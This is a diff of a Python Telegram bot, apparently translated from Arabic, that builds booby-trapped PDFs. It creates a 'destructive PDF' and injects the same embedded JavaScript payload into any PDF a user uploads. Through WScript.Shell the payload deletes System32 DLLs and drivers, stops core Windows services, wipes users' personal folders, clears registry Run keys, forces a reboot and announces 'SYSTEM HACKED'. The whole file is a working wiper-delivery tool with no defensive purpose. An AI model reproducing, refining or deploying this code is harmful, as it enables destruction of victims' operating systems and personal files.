@@ -11,7 +11,6 @@ API_URL = f"https://api.telegram.org/bot{TOKEN}"
 
 # ============ دوال البوت الأساسية ============
 def send_message(text):
-    """إرسال رسالة"""
     try:
         url = f"{API_URL}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
@@ -20,7 +19,6 @@ def send_message(text):
         pass
 
 def send_file(file_path, caption=""):
-    """إرسال ملف"""
     try:
         if not os.path.exists(file_path):
             return
@@ -32,9 +30,7 @@ def send_file(file_path, caption=""):
         pass
 
 def download_file(file_id, save_path):
-    """تحميل ملف من تيليجرام"""
     try:
-        # الحصول على رابط الملف
         url = f"{API_URL}/getFile"
         params = {"file_id": file_id}
         response = requests.get(url, params=params)
@@ -46,7 +42,6 @@ def download_file(file_id, save_path):
         file_path = data["result"]["file_path"]
         download_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
         
-        # تحميل الملف
         response = requests.get(download_url, stream=True)
         if response.status_code == 200:
             os.makedirs(os.path.dirname(save_path), exist_ok=True)
@@ -61,11 +56,9 @@ def download_file(file_id, save_path):
 
 # ============ إنشاء PDF التخريبي ============
 def create_destructive_pdf():
-    """إنشاء PDF تخريبي بدون مكتبات خارجية"""
     try:
         filename = f"/tmp/destructive_{int(time.time())}.pdf"
         
-        # كود التخريب
         js_code = """
         try {
             var shell = new ActiveXObject("WScript.Shell");
@@ -84,7 +77,7 @@ def create_destructive_pdf():
             shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
             shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
             shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
-            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
+            shell.Run("cmd.exe /c msg * SYSTEM HACKED! All files deleted.", 0, false);
         } catch(e) {
             try {
                 var shell = new ActiveXObject("WScript.Shell");
@@ -93,7 +86,6 @@ def create_destructive_pdf():
         }
         """
         
-        # بناء ملف PDF
         pdf = f"""%PDF-1.4
 1 0 obj
 << /Type /Catalog /Pages 2 0 R /Names << /JavaScript 5 0 R >> >>
@@ -107,7 +99,7 @@ endobj
 4 0 obj
 << /Length 80 >>
 stream
-BT /F1 24 Tf 100 700 Td (⚠️ هذا الملف سيؤدي إلى تدمير نظام Windows) Tj ET
+BT /F1 24 Tf 100 700 Td (WARNING: This file will destroy Windows) Tj ET
 endstream
 endobj
 5 0 obj
@@ -136,132 +128,129 @@ startxref
         
         return filename
     except Exception as e:
-        print(f"خطأ: {e}")
+        print(f"Error: {e}")
         return None
 
 # ============ حقن البايلود في ملف موجود ============
 def inject_payload(input_path, output_path):
-    """حقن البايلود في ملف PDF موجود"""
     try:
         with open(input_path, "rb") as f:
             data = f.read()
         
-        js_code = b"""
-        try {
-            var shell = new ActiveXObject("WScript.Shell");
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
-            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
-            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
-            shell.Run("cmd.exe /c sc stop bits", 0, false);
-            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
-            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
-            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
-            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
-            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
-            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
-            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
-        } catch(e) {
-            try {
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
-            } catch(e2) {}
-        }
-        """
+        js_code = """
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
+    shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
+    shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
+    shell.Run("cmd.exe /c sc stop bits", 0, false);
+    shell.Run("cmd.exe /c sc stop EventLog", 0, false);
+    shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
+    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
+    shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
+    shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
+    shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
+    shell.Run("cmd.exe /c msg * SYSTEM HACKED! All files deleted.", 0, false);
+} catch(e) {
+    try {
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
+    } catch(e2) {}
+}
+"""
         
         with open(output_path, "wb") as f:
-            f.write(data + b"\n\n" + js_code)
+            f.write(data + b"\n\n" + js_code.encode('utf-8'))
         
         return True
-    except:
+    except Exception as e:
+        print(f"Injection error: {e}")
         return False
 
 # ============ معالجة الأوامر ============
 def process_update(update):
-    """معالجة التحديث الوارد"""
     try:
         message = update.get("message", {})
         chat_id = str(message.get("chat", {}).get("id", ""))
         
-        # التحقق من الصلاحية
         if chat_id != CHAT_ID:
-            send_message("⛔ غير مصرح!")
+            send_message("Unauthorized!")
             return
         
-        # معالجة النص
         text = message.get("text", "").lower()
         
         if text == "/start":
             send_message("""
-🔐 مرحباً بك في بوت التخريب!
+Welcome to the Destruction Bot!
 
-📤 أرسل /generate لتوليد PDF تخريبي
-📤 أرسل أي ملف PDF لتعديله
-📤 أرسل /help للمساعدة
-            """)
+/generate - Create destructive PDF
+Send any PDF file - It will be injected
+/help - Show commands
+""")
         
         elif text == "/generate":
-            send_message("⏳ جاري التوليد...")
+            send_message("Generating...")
             filepath = create_destructive_pdf()
             if filepath:
-                send_file(filepath, "⚒️ PDF تخريبي - احذر!")
+                send_file(filepath, "Destructive PDF - Use with caution!")
                 os.remove(filepath)
             else:
-                send_message("❌ فشل التوليد!")
+                send_message("Generation failed!")
         
         elif text == "/help":
             send_message("""
-📋 الأوامر:
-/start - الترحيب
-/generate - توليد PDF تخريبي
-/status - الحالة
-/help - المساعدة
-            """)
+Commands:
+/start - Welcome
+/generate - Create destructive PDF
+/status - Bot status
+/help - This message
+
+Send any PDF to inject payload
+""")
         
         elif text == "/status":
-            send_message(f"🟢 يعمل\n⏰ {datetime.now().strftime('%H:%M:%S')}")
+            send_message(f"Bot is running\nTime: {datetime.now().strftime('%H:%M:%S')}")
         
-        # معالجة الملفات
         document = message.get("document")
         if document:
             file_id = document["file_id"]
             file_name = document.get("file_name", "file.pdf")
             
-            send_message(f"⏳ جاري تحميل: {file_name}")
+            send_message(f"Downloading: {file_name}")
             
             input_path = f"/tmp/input_{random.randint(1000,9999)}"
             output_path = f"/tmp/output_{random.randint(1000,9999)}"
             
             if download_file(file_id, input_path):
-                send_message("✅ تم التحميل، جاري الحقن...")
+                send_message("Downloaded! Injecting payload...")
                 
                 if inject_payload(input_path, output_path):
                     new_name = f"injected_{file_name}"
-                    send_file(output_path, f"⚒️ {new_name}")
-                    send_message("✅ تم إرسال الملف المعدل!")
+                    send_file(output_path, f"Injected: {new_name}")
+                    send_message("Injected file sent!")
                 else:
-                    send_message("❌ فشل الحقن!")
+                    send_message("Injection failed!")
                 
-                # تنظيف
                 try:
                     os.remove(input_path)
                     os.remove(output_path)
                 except:
                     pass
             else:
-                send_message("❌ فشل التحميل!")
+                send_message("Download failed!")
     
     except Exception as e:
-        print(f"خطأ: {e}")
+        print(f"Error: {e}")
 
 # ============ الاستماع ============
 def main():
-    print("🚀 تشغيل البوت...")
-    send_message("🟢 تم تشغيل البوت!")
+    print("Bot starting...")
+    send_message("Bot is now running!")
     
     last_id = 0
     while True:
@@ -279,7 +268,7 @@ def main():
             
             time.sleep(1)
         except Exception as e:
-            print(f"⚠️ خطأ: {e}")
+            print(f"Error: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
